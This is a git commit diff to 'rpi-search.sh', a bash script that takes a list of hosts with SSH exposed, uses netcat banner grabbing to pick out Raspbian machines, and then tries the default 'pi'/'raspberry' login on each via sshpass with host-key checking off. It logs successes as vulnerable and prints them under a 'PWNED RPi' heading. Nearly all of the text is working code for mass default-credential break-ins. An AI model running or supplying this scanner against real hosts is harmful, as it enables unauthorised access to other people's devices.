53e59ca4fa76bcfdb3babf45f9e294777976de2c
Thomas Clauzel <t.clauzel@gmail.com>
2020-03-26 13:15:28 +0100

    Update rpi-search.sh

--- rpi-search.sh
+++ rpi-search.sh
@@ -1,4 +1,3 @@
-
 #!/bin/bash
 echo "
 
@@ -21,26 +20,41 @@ echo " List of exposed ssh server : "
 echo ""
 cat ip_ssh_open.txt
 echo -e "\e[31m --------------------------------- \e[0m"
-echo -e "\e[31m TRYING DEFAUT LOGIN FOR RPi  \e[0m"
+echo -e "\e[31m DISCOVER RPi ON THE LIST   \e[0m"
 echo -e "\e[31m --------------------------------- \e[0m \n"
 cat ip_ssh_open.txt |  while read output
 do
-    echo "check for $output"
-    out=$(sshpass -p 'raspberry' ssh -T -o StrictHostKeyChecking=no  pi@$output /root 2>&1)
-    echo $out > tmp.txt
-    string1="Permission denied, please try again."
-    if grep -qF "$string1" tmp.txt;then
-        echo "$output is not vulnerable"
+echo "banner grabbing" | nc -w 5 $output 22 > bannertmp.txt
+    banner="Raspbian"
+    if grep -qF "$banner" bannertmp.txt;then
+        echo "$output is probably a rpi !!!"
+        echo $output >> rpi_exposed.txt
     else
+        echo "$output is not rpi"
+    fi
+done
+echo -e "\e[31m --------------------------------- \e[0m"
+echo -e "\e[31m TRYING DEFAUT LOGIN FOR RPi  \e[0m"
+echo -e "\e[31m --------------------------------- \e[0m \n"
+cat rpi_exposed.txt |  while read output
+do
+    echo "check for $output"
+    out=$(sshpass -p 'raspberry' ssh -T -o StrictHostKeyChecking=no  pi@$output echo ok 2>&1)
+    echo $out > tmp.txt
+    string1="ok"
+    if grep -qF "$string1" tmp.txt;then
         echo "$output is vulnerable !!!"
         echo $output >> vulerables_rpi.txt
+    else
+        echo "$output is not vulnerable"
     fi
-echo "quitte boucle"
 done
 rm tmp.txt > /dev/null 2>&1
 rm liste_rpi.txt > /dev/null 2>&1
 rm liste_open.txt > /dev/null 2>&1
 rm ip_ssh_open.txt > /dev/null 2>&1
+rm rpi_exposed.txt > /dev/null 2>&1
+rm bannertmp.txt  > /dev/null 2>&1
 echo -e "\e[31m --------------------------------- \e[0m"
 echo -e "\e[31m PWNED RPi : \e[0m"
 echo -e "\e[31m --------------------------------- \e[0m \n"
